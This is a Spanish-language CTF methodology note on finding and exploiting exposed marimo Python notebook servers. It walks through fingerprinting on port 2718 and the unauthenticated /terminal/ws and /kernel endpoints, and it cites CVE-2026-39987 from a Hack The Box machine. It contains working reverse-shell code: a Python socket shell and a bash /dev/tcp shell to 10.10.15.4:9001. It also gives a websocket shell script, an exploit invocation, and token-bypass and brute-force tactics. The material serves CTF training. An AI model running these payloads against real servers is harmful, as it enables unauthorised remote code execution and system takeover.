MarIMO es un **notebook de Python reactivo y open source** (alternativa a Jupyter): escribes código en celdas y **todo el notebook se re-evalúa automáticamente** cuando cambias algo (programación reactiva, tipo Excel pero con Python). Se ejecuta en el navegador, con un kernel de Python detrás, y puede tener IA asistente integrada.

Lo importante para nosotros: **marimo ES ejecución arbitraria de Python por diseño**. Si el servidor está expuesto y no exige autenticación, cualquiera que llegue puede correr código = RCE directo. No hay que "romper" nada, solo llegar.

Proyecto: `https://github.com/marimo-team/marimo` (pip: `pip install marimo`).

## Como se ejecuta (y que expone)

```bash
marimo edit notebook.py        # modo edicion (total: celdas editables)
marimo run notebook.py         # modo solo lectura (app)
marimo tutorial intro          # tutoriales
marimo edit --host 0.0.0.0     # escucha en todas las interfaces (peligroso)
marimo edit -t <token>         # con token de acceso
marimo edit --no-token         # SIN token -> cualquiera entra
```

- **Puerto por defecto: `2718`** (`http://localhost:2718`).
- Por defecto solo escucha en `127.0.0.1`; con `--host 0.0.0.0` queda en la red.
- Autenticación por **token** en la URL/cookie. `--no-token` o `--token=""` = acceso libre.
- Modos: `edit` (editor), `run` (app publicada), `export` (estático).

En CTF siempre aparece así: alguien corrió `marimo edit --host 0.0.0.0 --no-token` y quedó colgado en un puerto expuesto.

## Como identificar que hay MarIMO

- Puerto **2718** abierto.
- El HTML/JS contiene `marimo`, `/_marimo/`, `marimo_version`.
- Headers/cookies: `marimo-*`.
- Página con UI de notebook (celdas, "Run" ▶, barra lateral de imports) pero NO es Jupyter (Jupyter usa `/tree`, `/api/kernels`, puerto 8888).

```bash
# Puertos
nmap -sV -p- IP | grep -i 2718

# Buscar la version en el HTML/JS servido
curl -s http://IP:2718/ | grep -io "marimo[^\"']*" | head
curl -s http://IP:2718/ | grep -o "[0-9]\+\.[0-9]\+\.[0-9]\+"

# Endpoint de version/health (varia segun version)
curl -s http://IP:2718/api/version
curl -s http://IP:2718/health
curl -sI http://IP:2718/

# Fuzz de rutas
ffuf -u http://IP:2718/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Saber la **versión exacta es CLAVE**: es lo que te dice si es vulnerable a algo conocido.

## Superficie de ataque / endpoints típicos

| Ruta / tipo | Descripcion |
| :--- | :--- |
| `/` | Editor del notebook (si no pide token, ya tienes acceso) |
| `/terminal/ws` | **WebSocket de terminal** -> shell del sistema (objeto clásico de explotación) |
| `/kernel` (ws) | WebSocket del kernel: ejecutar celdas de Python = RCE |
| `/api/*` | API interna (kernel ops, save file, open file, version) |
| `/api/version`, `/health` | Version y estado |
| WebSocket genérico | Todo el control del notebook pasa por WS, revisa las que aparecen en el JS |

Como las rutas cambian entre versiones, la buena es **abrir el JS del bundle** y extraer de ahi las rutas/websockets reales:

```bash
curl -s http://IP:2718/ | grep -o '/[^"]*\.js' | sort -u
curl -s http://IP:2718/<archivo.js> | grep -oE '"/[a-z0-9_/]+"' | sort -u
```

## Vulnerabilidades / formas de entrar

### 1. Sin autenticación (el escenario más común)

Si no pide token, puedes correr Python directamente desde la API/WS:

```python
# lo que ejecutarías en una celda
import socket,subprocess,os
s=socket.socket(); s.connect(("TU_IP",9001))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

### 2. `/terminal/ws` -> RCE no autenticado

WebSocket que levanta una shell en el servidor. Si **no valida sesión/origen**, basta conectarse:

```python
# ejemplo conceptual: WS sin autenticacion
import asyncio, websockets
async def go():
    async with websockets.connect("wss://IP/terminal/ws") as ws:
        await ws.send("id\n")
        print(await ws.recv())
asyncio.run(go())
```

**[[Cohort]]**: MarIMO `0.20.4` -> **CVE-2026-39987**, RCE sin autorización por `/terminal/ws`. Se usó un exploit público que manda el reverse shell por ese WS.

```bash
python exploit2.py "https://nb-1be3782a8afd3ad5.cohort.htb" \
  "setsid bash -c 'bash -i >& /dev/tcp/10.10.15.4/9001 0>&1' < /dev/null &"
```

(Detalle completo en [[Cohort]]).

### 3. Versiones con CVEs conocidos

```bash
# Buscar por version
searchsploit marimo
# o googlear: marimo <version> CVE / GHSA
```

Patrones históricos en notebooks/servidores de este estilo:

- **Auth bypass** (el token se valida en cliente o se puede bypassear por header/cookie).
- **Path traversal** al guardar/abrir archivos (`open file` sin sanitizar `../`).
- **SSRF** desde el kernel (requests dentro del notebook apuntando a servicios internos).
- **CSWSH**: WebSocket sin validar `Origin` -> si visitas una web maliciosa, tu navegador conecta por ti (útil cuando hay token en cookie).
- **Deserialización / exec** de contenido del notebook (si un `.py`/`.ipynb` subido por otro usuario se ejecuta).

### 4. Escalada post-entra

Una vez con ejecución de Python, ya estás dentro de la máquina:

```python
__import__('os').system('id; cat /flag*; ls -la /home')
```

Y de ahi a enumerar para la privesc (ver [[Escaladas de privilegios]]).

## Flujo de trabajo en CTF

1. **Detectar** (puerto 2718, `marimo` en el HTML, UI de notebook).
2. **Sacar la versión** (`/api/version`, JS bundle, cookies).
3. Buscar **CVE/exploit** para esa versión (GitHub advisories, searchsploit, GitHub issues).
4. Probar `/terminal/ws` y `/kernel` sin autenticación.
5. Si pide token: probar token vacío/`token=`, brute-force corto, CSWSH con Origin falsificado.
6. Meter reverse shell:

```bash
# tu listener
nc -lvnp 9001
# en el exploit / celda:
setsid bash -c 'bash -i >& /dev/tcp/10.10.15.4/9001 0>&1' < /dev/null &
```

7. Escalar privilegios en la máquina.

